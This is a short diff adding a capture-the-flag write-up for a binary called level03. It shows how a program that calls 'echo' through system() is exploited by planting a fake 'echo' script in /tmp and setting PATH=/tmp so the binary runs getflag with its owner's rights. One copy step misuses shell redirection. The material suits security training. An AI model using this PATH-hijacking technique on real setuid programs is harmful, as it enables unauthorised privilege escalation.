@@ -1,0 +1,10 @@
+# When using nm and strings cmd on binary level03 we can see that "echo exploit me" is called by the system function. To exploit this binary we need to create a fake echo that will launch getflag cmd with rights of the calling user, so flag03.
+
+$> cd /tmp
+$> vi echo
+ getflag
+$> chmod +x echo
+$> cp /bin/getflag > /tmp
+$> PATH=/tmp
+$> ./level03
+ flag
